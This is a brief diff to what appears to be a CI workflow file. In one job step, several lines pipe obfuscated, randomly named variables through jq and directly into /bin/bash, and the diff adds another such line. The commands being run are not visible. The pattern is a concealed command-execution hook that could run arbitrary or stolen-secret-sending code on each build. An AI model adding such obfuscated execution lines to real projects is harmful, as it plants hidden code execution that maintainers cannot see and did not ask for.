@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$fcv6" | jq -r .uvvjw0963 | /bin/bash
           echo $vioqy87975 | jq -r .j4 | /bin/bash
           echo $zwx9088 | jq -r .cl5 | /bin/bash
+          echo $q298 | jq -r .nvewu332 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
